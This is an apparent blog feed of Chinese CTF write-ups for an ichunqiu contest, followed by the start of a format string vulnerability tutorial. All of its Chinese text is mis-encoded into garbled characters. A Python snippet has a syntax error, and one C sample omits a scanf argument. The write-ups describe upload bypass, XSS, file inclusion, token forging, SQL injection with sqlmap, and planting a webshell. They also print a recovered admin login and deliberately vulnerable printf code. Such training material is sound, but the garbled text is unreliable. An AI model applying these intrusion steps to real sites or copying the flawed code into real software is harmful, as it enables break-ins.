href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-6.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-6.png"></a></p><h2 id="æ´å¯ŸåŠ›æ˜¯ä½ å–èƒœçš„å…³é”®"><a href="#æ´å¯ŸåŠ›æ˜¯ä½ å–èƒœçš„å…³é”®" class="headerlink" title="æ´å¯ŸåŠ›æ˜¯ä½ å–èƒœçš„å…³é”®"></a>æ´å¯ŸåŠ›æ˜¯ä½ å–èƒœçš„å…³é”®</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-7.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-7.png"></a></p><p>æŸ¥çœ‹æºä»£ç å‘ç°å¥‡æ€ªçš„é¡µé¢ç‚¹å‡»è¿›å» ç„¶åå‘ç°æ˜¯ä¸€ä¸ªç†Ÿæ‚‰çš„ä¸œè¥¿<br><a href="http://tool.chinaz.com/js.aspx">è§£å¯†åœ°å€</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-8.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-8.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-9.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-9.png"></a></p><h1 id="ç®—æ³•é¢˜"><a href="#ç®—æ³•é¢˜" class="headerlink" title="ç®—æ³•é¢˜"></a>ç®—æ³•é¢˜</h1><p><strong>æˆ‘åªè®°å¾—ä¸¤ä¸ªäº†</strong></p><h2 id="å•èº«ç‹—åº”æœ‰çš„çœ¼åŠ›"><a href="#å•èº«ç‹—åº”æœ‰çš„çœ¼åŠ›" class="headerlink" title="å•èº«ç‹—åº”æœ‰çš„çœ¼åŠ›"></a>å•èº«ç‹—åº”æœ‰çš„çœ¼åŠ›</h2><p>é¢˜ç›®å¾ˆç®€å• pythonç®€å•è§£å†³</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-10.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-10.png"></a></p><h2 id="ç¥å¥‡æ•°"><a href="#ç¥å¥‡æ•°" class="headerlink" title="ç¥å¥‡æ•°"></a>ç¥å¥‡æ•°</h2><p>æ‡’å¾—è´´å›¾äº†ç›´æ¥è´´ä»£ç å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">31991</span>,<span class="number">99381</span>):</span><br><span class="line">    <span class="keyword">if</span> len(set(str(i**<span class="number">2</span>)==<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">print</span> i**<span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="è®¡ç®—æœºåŸç†åŸºç¡€"><a href="#è®¡ç®—æœºåŸç†åŸºç¡€" class="headerlink" title="è®¡ç®—æœºåŸç†åŸºç¡€"></a>è®¡ç®—æœºåŸç†åŸºç¡€</h1><p><strong>è¦ä¸è¦è¿™ä¹ˆç›´æ¥é€åˆ†é˜¿</strong></p><h2 id="ASCLL-ä¸äºŒè¿›åˆ¶"><a href="#ASCLL-ä¸äºŒè¿›åˆ¶" class="headerlink" title="ASCLL ä¸äºŒè¿›åˆ¶"></a>ASCLL ä¸äºŒè¿›åˆ¶</h2><p>7â€¦</p><h2 id="ç®—ç®—äºŒè¿›åˆ¶"><a href="#ç®—ç®—äºŒè¿›åˆ¶" class="headerlink" title="ç®—ç®—äºŒè¿›åˆ¶"></a>ç®—ç®—äºŒè¿›åˆ¶</h2><p>2<strong>20-1=1048575 **ä¸æƒ³è¯´è¯</strong></p><h2 id="ä½ ä¼šå—"><a href="#ä½ ä¼šå—" class="headerlink" title="ä½ ä¼šå—"></a>ä½ ä¼šå—</h2><h1 id="å¯†ç å­¦"><a href="#å¯†ç å­¦" class="headerlink" title="å¯†ç å­¦"></a>å¯†ç å­¦</h1><h2 id="æ®‹ç¼ºçš„base64"><a href="#æ®‹ç¼ºçš„base64" class="headerlink" title="æ®‹ç¼ºçš„base64"></a>æ®‹ç¼ºçš„base64</h2><p>è·‘ä¸ªè„šæœ¬ å‘ç°åŸæ–‡æ˜¯é•œèŠ±æ°´æœˆ æ‰€ä»¥ç­”æ¡ˆæ˜¯ 6ZWc6Iqx5rC05pyI</p><h2 id="é”™è¯¯çš„md5"><a href="#é”™è¯¯çš„md5" class="headerlink" title="é”™è¯¯çš„md5"></a>é”™è¯¯çš„md5</h2><p>è¿™ä¸ªæ‰è®©æˆ‘æœ‰ç‚¹æ”¶è· æˆ‘é—®äº†ä¸‹æ±ªç¥ æ±ªç¥ä¸€è„¸çœ‹æ™ºéšœçš„å’Œmd5ç®—æ˜¯hex æ‰€ä»¥ä»–åŒ…å«çš„å­—æ¯åªæœ‰<strong>a-f</strong>æ˜¯æ²¡æœ‰Lçš„ æ‰€ä»¥æŠŠLâ†’1å°±Okäº†</p><h2 id="å°±å·®ä¸€æ­¥"><a href="#å°±å·®ä¸€æ­¥" class="headerlink" title="å°±å·®ä¸€æ­¥"></a>å°±å·®ä¸€æ­¥</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-11.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-11.png"></a></p><h2 id="è¿™å¥è¯æœ‰ç‚¹æ„æ€"><a href="#è¿™å¥è¯æœ‰ç‚¹æ„æ€" class="headerlink" title="è¿™å¥è¯æœ‰ç‚¹æ„æ€"></a>è¿™å¥è¯æœ‰ç‚¹æ„æ€</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-12.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-12.png"></a></p><p>åŸ¹æ ¹å¯†ç å¾ˆç®€å•å§</p><h1 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h1><h2 id="æœ‰é€‰æ‹©å—ï¼Ÿ"><a href="#æœ‰é€‰æ‹©å—ï¼Ÿ" class="headerlink" title="æœ‰é€‰æ‹©å—ï¼Ÿ"></a>æœ‰é€‰æ‹©å—ï¼Ÿ</h2><p>é€‰æ‹©é¢˜ é€‰B</p><h2 id="flagå‘¢"><a href="#flagå‘¢" class="headerlink" title="flagå‘¢"></a>flagå‘¢</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-13.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-13.png"></a></p><p>ç„¶åç®€å•è½¬ç å°±å¥½äº†</p><h2 id="ä¸‡ä¸­æœ‰ä¸€å‘¢"><a href="#ä¸‡ä¸­æœ‰ä¸€å‘¢" class="headerlink" title="ä¸‡ä¸­æœ‰ä¸€å‘¢"></a>ä¸‡ä¸­æœ‰ä¸€å‘¢</h2><p>flagåœ¨æŸä¸ªåŒ…é‡Œ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-14.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-14.png"></a></p><h2 id="å¤§é»‘é˜”"><a href="#å¤§é»‘é˜”" class="headerlink" title="å¤§é»‘é˜”"></a>å¤§é»‘é˜”</h2><p>å¹¿ä¸œå¼ºç½‘æ¯çš„åŸé¢˜ è‡ªå·±çœ‹çœ‹å§<br><a href="http://blog.csdn.net/u012763794/article/details/50132513">ä¼ é€é—¨</a><br>æ ¹æ®èŠå¤©è®°å½•æ‰¾flag</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p><code>çœ‹çœ‹æˆ‘çš„å¦å¤–ä¸€ç¯‡æ–‡ç« å§</code><br><a href="http://wing3.cn/2016/07/04/ichunqiu-Pwn/#more">é£æœºç¥¨ichunqiu-pwn</a></p><h1 id="ç»¼åˆæ¸—é€"><a href="#ç»¼åˆæ¸—é€" class="headerlink" title="ç»¼åˆæ¸—é€"></a>ç»¼åˆæ¸—é€</h1><h2 id="æ•´ç«™æˆ‘ä¹Ÿèƒ½çœ‹åˆ°"><a href="#æ•´ç«™æˆ‘ä¹Ÿèƒ½çœ‹åˆ°" class="headerlink" title="æ•´ç«™æˆ‘ä¹Ÿèƒ½çœ‹åˆ°"></a>æ•´ç«™æˆ‘ä¹Ÿèƒ½çœ‹åˆ°</h2><p><code>Pcatè¡¨å“¥</code>ç»™çš„æç¤º<br>å…¶å®å°±æ‰æ–‡ä»¶åå­—å’Œæ ¼å¼ æ ¹æ®å½¢çŠ¶å¤ªé•¿å¾—åƒå‹ç¼©åŒ…æ–‡ä»¶ æ‰€ä»¥çŒœæ–‡ä»¶åæ˜¯gift.rar ç„¶åå°±æ‹¿åˆ°flagäº†</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/icnhunqiu-15.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/icnhunqiu-15.png"></a></p><h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><p>æ‰«ä¸€ä¸‹ç›®å½• å‘ç°ä¸€ä¸ªsql.sqlçš„ç½‘é¡µ è®¿é—®å°±æ‹¿åˆ°flagäº†</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-16.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-16.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-17.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-17.png"></a></p><h2 id="flagåœ¨å“ª"><a href="#flagåœ¨å“ª" class="headerlink" title="flagåœ¨å“ª"></a>flagåœ¨å“ª</h2><p>ä¸Šä¼ é¢˜ç›® åªéœ€è¦æŠ“åŒ…æŠŠåç¼€æ”¹å¤§å°å³å¯</p><h2 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h2><p>è¿™ä¹Ÿæ˜¯åŸé¢˜ å’Œä¸Šé¢çš„<code>å¤§é»‘é˜”</code>æ˜¯å‡ºè‡ªåŒä¸€ä¸ªåœ°æ–¹ ä½ ä»¬å¯ä»¥è‡ªå·±å†çœ‹çœ‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-18.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-18.png"></a>å¼¹å¼¹å¼¹</p><p>ç®€å•çš„XSS</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-19.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-19.png"></a></p><h2 id="å°±åœ¨å…¶ä¸­"><a href="#å°±åœ¨å…¶ä¸­" class="headerlink" title="å°±åœ¨å…¶ä¸­"></a>å°±åœ¨å…¶ä¸­</h2><p>æ–‡ä»¶åŒ…å«é¢˜ç›® </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-20.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-20.png"></a></p><p>æœ‰å…´è¶£å¯ä»¥çœ‹çœ‹ä¹Œäº‘çš„æ–‡ç« <br><a href="http://drops.wooyun.org/tips/3827">ä¹Œäº‘:PHPæ–‡ä»¶åŒ…å«</a></p><h2 id="æ»¡å¤©è¿‡æµ·"><a href="#æ»¡å¤©è¿‡æµ·" class="headerlink" title="æ»¡å¤©è¿‡æµ·"></a>æ»¡å¤©è¿‡æµ·</h2><p>ä¿®æ”¹tokençš„å€¼ä¸ºadmin1çš„<code>md5</code>å€¼å³å¯</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-21.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-21.png"></a></p><h2 id="æ‘„å½±å¸ˆçš„å®¶"><a href="#æ‘„å½±å¸ˆçš„å®¶" class="headerlink" title="æ‘„å½±å¸ˆçš„å®¶"></a>æ‘„å½±å¸ˆçš„å®¶</h2><p>æˆ‘sqlmapè·‘ä¸å‡ºåˆ—åå’Œè¡¨åä¸çŸ¥é“ä½ ä»¬å¯ä»¥ä¸å¯ä»¥<br>ç„¶åæˆ‘ç”¨å…¶ä»–å·¥å…·è·‘å‡ºæ¥äº†åˆ—åå’Œè¡¨åï¼Œç„¶åæˆ‘ç”¨æ‰‹å·¥çš„æ–¹å¼å°†åˆ—åå’Œè¡¨åå†™åœ¨sqlmapä¸Š æˆåŠŸè·‘å‡ºåå°å¸å·å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è´¦å·ï¼šlinhai</span><br><span class="line">å¯†ç ï¼šlinhai19760812</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ä¸€äº›å¥‡æ·«æŠ€å·§ä¼ äº†ä¸ªé©¬ falgå°±åœ¨æ ¹ç›®å½•ä¸‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-22.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-22.png"></a></p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>æœ¬æ¥æƒ³åæ§½çš„ æƒ³æƒ³ç®—äº†â€¦</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹-è…¾è®¯30å¼º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiu-Pwn</title>
      <link href="ichunqiu-Tencent-top30-Pwn.html"/>
      <url>ichunqiu-Tencent-top30-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h1><p>è¿™ä¸ªé¢˜ç›®æ˜¯æˆ‘Yllenå¸ˆå‚…æé†’äº†æˆ‘çš„ï¼Œä½†æ˜¯æˆ‘ä¾æ—§ä¸çŸ¥é“æ€ä¹ˆå†™ä»£ç ï¼  å¤§å†™çš„å°´å°¬</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-45-19.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-45-19.jpg"></a></p><p>å…³é”®åœ¨è¿™ funcè¿™ä¸ªæ•°ç»„å¯è¾¾åˆ°è¶Šç•Œçš„æ•ˆæœï¼Œv6çš„ä¸‹æ ‡æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œæœ€åæˆ‘ä»¬è¦è¾¾åˆ°çš„ç»“æœæ˜¯ä»€ä¹ˆ<br>å°±æ˜¯æ§åˆ¶çš„ç»“æœåˆ°</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-47-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-47-02.jpg"></a></p><p>bufé‡Œé¢å³å¯ã€‚</p><h1 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2"></a>Pwn2</h1><p>Pwn2 æ ¹æ®æˆ‘Chuå¤§è¡¨å“¥æ‰€è¯´æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æœ‰ç‚¹éš¾åº¦ç­‰æˆ‘å­¦ä¹ ä¸€æ®µæ—¶é—´å†æ¥å†™å§ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-57-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-57-01.jpg"></a></p><h1 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h1><p>æ ¹æ®Chuè¡¨å“¥çš„æè¿°<br>è¿™ä¸ªé¢˜ç›®æ˜¯æ ˆæº¢å‡º,X64 ROPâ€¦æˆ‘ä¹Ÿä¸å¤ªæ¸…æ¥šï¼Œåƒæˆ‘è¿™è¿pwntoolsçš„ä¸ä¼šç”¨çš„æ¸£æ¸£ã€‚åªèƒ½å¤šå¤šå­¦ä¹ äº†ã€‚<br>#Pwn4<br>è¯´æ—¶å€™è¿™ä¸ªå¥½ç®€å•â€¦å¥½å‚»çš„é¢˜ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-16-00-31.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-16-00-31.jpg"></a></p><p>bufçš„ç©ºé—´æ˜¯40ï¼Œscanfçš„å¤§å°ä¹Ÿæ˜¯40è¿™æ ·å°±å¯¼è‡´äº†ä¸€ä¸ªé—®é¢˜ã€‚å»æ‰å°¾éƒ¨çš„â€ã€00â€,ç„¶åname2ä¸‹æ–¹ç›¸é‚»çš„å°±æ˜¯flagçš„æ¯ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æœ€ç»ˆå¯ä»¥è¾¾åˆ°æŠŠflagä¸€ä¸ªä¸€ä¸ªleakå‡ºæ¥ã€‚</p><p><a href="http://7xt21h.com1.z0.glb.clouddn.com/2016-07-04%2023-48-58.jpg?imageView2/2/w/640/h/427/interlace/1/q/100" class="gallery-item"><img src="http://7xt21h.com1.z0.glb.clouddn.com/2016-07-04%2023-48-58.jpg?imageView2/2/w/640/h/427/interlace/1/q/100"></a></p><p>#ä¸€äº›ç›¸å…³<br><a href="http://sh3ll.me/2016/07/04/ichunqiu-tenCentAp/">Chuè¡¨å“¥åšå®¢æ–‡ç« </a><br><a href="http://www.freebuf.com/articles/system/74224.html">å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´</a><br><a href="https://yunpan.cn/cBQHR9WjrI9Ra">Pwné¢˜ç›®æ‰“åŒ…</a>  PS:ï¼ˆæå–ç ï¼š745cï¼‰</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> iæ˜¥ç§‹-è…¾è®¯30å¼º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</title>
      <link href="Talking-about-Formatting-String-Vulnerability.html"/>
      <url>Talking-about-Formatting-String-Vulnerability.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p> å¼€å§‹æ¥è§¦æ¼æ´åˆ©ç”¨äº†ï¼Œè¿™ç®—æ˜¯Chuå¸ˆå‚…å¸¦æˆ‘è¿›Pwnçš„é—¨é˜¿ å¤ªé»‘å®¢äº†ã€‚<br>è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘è‡ªå·±ç†è§£ä»¥åŠåŠ ä»¥æ•´ç†çš„ï¼Œå¯èƒ½æœ‰åè¯¯ä¹‹ç±»çš„æ¬¢è¿å¤§å®¶æŒ‡æ­£ã€‚</p><h2 id="åº"><a href="#åº" class="headerlink" title="åº"></a>åº</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§ï¼Œç®€å•çš„æ¼æ´ç±»å‹ã€‚æˆ‘ç®—æ˜¯ä»è¿™é‡Œå¼€å§‹å…¥é—¨CTFçš„pwnçš„ã€‚å®ƒçœ‹èµ·æ¥å°±ç®€å•ï¼Œä½†æ˜¯å±å®³å´ä¸å°ã€‚</p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h3><p>åœ¨è®²æ­£æ–‡å‰å…ˆæä¸€ä¸ªç®€å•çš„ä¸œè¥¿ï¼Œä¸ºäº†æ›´å¥½äº†è§£æ¼æ´å…ˆæä¸€ä¸‹æ ˆã€‚<br>æ ˆå†…å­˜åœ¨è¿›ç¨‹çš„ä½œç”¨å¦‚ä¸‹:</p><ol><li>æš‚æ—¶ä¿å­˜å‡½æ•°å†…çš„å±€éƒ¨å˜é‡</li><li>è°ƒç”¨å‡½æ•°æ—¶ä¼ é€’å‚æ•°</li><li>ä¿å­˜å‡½æ•°è¿”å›åçš„åœ°å€<br>æ ˆå…¶å®æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒæŒ‰ç…§FILO(åè¿›å…ˆå‡º)çš„åŸåˆ™å­˜å‚¨æ•°æ®ã€‚<br>##æ ˆçš„ç‰¹å¾<br>æ ˆå†…å­˜çš„ç»“æ„ä¸€èˆ¬å¦‚å›¾</li></ol><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/about-fmt-stack.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/about-fmt-stack.jpg"></a></p><p>ç®€å•äº†è§£å‡ ä¸ªçŸ¥è¯†</p><ol><li><p>PUSH å…¥æ ˆ  </p></li><li><p>POP å‡ºæ ˆ</p></li><li><p>ESP æ ˆé¡¶æŒ‡é’ˆ</p><p>  ä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œæ ˆé¡¶æŒ‡é’ˆ(ESP)åˆå§‹çŠ¶æ€æŒ‡å‘æ ˆé¡¶ç«¯ã€‚æ‰§è¡ŒPUSHå‘½ä»¤å°†æ•°æ®å‹å…¥æ ˆæ—¶ï¼Œæ ˆé¡¶æŒ‡é’ˆå°±ä¼šä¸Šç§»åˆ°æ ˆé¡¶ç«¯ã€‚æ‰§è¡ŒPOPå‘½ä»¤ä»æ ˆä¸­å¼¹å‡ºæ•°æ®æ—¶ï¼Œè‹¥æ ˆæ˜¯ç©ºçš„ï¼Œåˆ™æ ˆé¡¶æŒ‡é’ˆé‡æ–°ç§»åŠ¨åˆ°æ ˆä½ç«¯ã€‚  </p><p>ç®€å•çš„è®²ï¼Œæ ˆæ˜¯ä¸€ç§ç”±é«˜åœ°å€å‘ä½åœ°å€æ‰©å±•çš„æ•°æ®ç»“æ„ã€‚å°±åƒç Œå¢™ä¸€æ ·ï¼Œå‘æ ˆä¸­å‹å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®å°±åƒç –å¢™ï¼Œæ²¡ç Œä¸Šä¸€å±‚ï¼Œå¢™å°±é«˜ä¸€ç‚¹ã€‚(PS:æ ˆåº•æ˜¯é«˜åœ°å€ï¼Œæ ˆé¡¶æ˜¯ä½åœ°å€)</p></li></ol><p>#æ¼æ´ç®€ä»‹<br>ä¼šè§¦å‘æ ¼å¼åŒ–å­—ç¬¦æ¼æ´çš„å‡½æ•°æœ‰<strong>pirntf</strong>ã€<strong>sprintf</strong>ã€<strong>fprintf</strong>ï¼Œä½†ä¸å±€äºè¿™äº›çš„cåº“ä¸­çš„printfå®¶æ—å‡½æ•°ã€‚<br>##ä»€ä¹ˆæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²<br>ä»æ˜¯ä»€ä¹ˆå…¥æ‰‹å§:<br>ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯ä¸€ä¸ªASCIIå­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…æ‹¬äº†æ–‡æœ¬å’Œæ ¼å¼å‚æ•°ã€‚æˆ‘ä»¬ä»ç®€å•çš„<strong>printf</strong>å…¥æ‰‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;What is your name: %s&quot;,&quot;Summer&quot;)</span><br></pre></td></tr></table></figure><p>è¿™ç§æ ·å­çš„printfå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç®€å•çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Œä½œç”¨æ˜¯å‘Šè¯‰ä¸€ä¸ªç¨‹åºå¦‚ä½•è¿›è¡Œæ ¼å¼åŒ–çš„è¾“å‡ºçš„è¯´æ˜ç¬¦å·ã€‚ç®€å•çš„è®²ï¼Œä»–å°±æ˜¯å‘Šè¯‰æœºå™¨ï¼Œç­‰ç­‰ä½ è¦è¾“å‡ºçš„å†…å®¹æ˜¯ä»€ä¹ˆæ ¼å¼çš„ï¼Œè¯¥æ€ä¹ˆè¾“å‡ºã€‚<br>åœ¨Cè¯­è¨€ä¸­æˆ‘ä»¬æœ‰è®¸å¤šæ ¼å¼åŒ–å­—ç¬¦çš„è¯´æ˜ç¬¦å·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d -åè¿›åˆ¶  è¾“å‡ºçš„æ˜¯æ•´æ•°å‹çš„åè¿›åˆ¶æ•´æ•°</span><br><span class="line">%s - å­—ç¬¦ä¸²  è¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²</span><br><span class="line">%c - å­—ç¬¦     è¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦</span><br><span class="line">%p - æŒ‡é’ˆ    æŒ‡é’ˆåœ°å€</span><br><span class="line">%n - è¾“å‡ºçš„æ˜¯å­—ç¬¦çš„ä¸ªæ•°</span><br><span class="line">......çœç•¥å·</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ä»¥ä¸Šçš„ä¸åŒçš„æ•°æ®ç±»å‹ã€‚è€Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡½æ•°å°±æ˜¯ä¸Šæ–‡æåˆ°çš„<strong>printf</strong>ç­‰ç­‰ä¸å±€é™äºæ­¤çš„å‡½æ•°ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä½¿ç”¨<strong>printf</strong>è¿™ä¸ªå‡½æ•°çš„å½¢å¼ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(â€œ%s<span class="string">&quot;,a);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœç¨‹åºå‘˜ä¸€å·æ‡’å°±å˜æˆäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 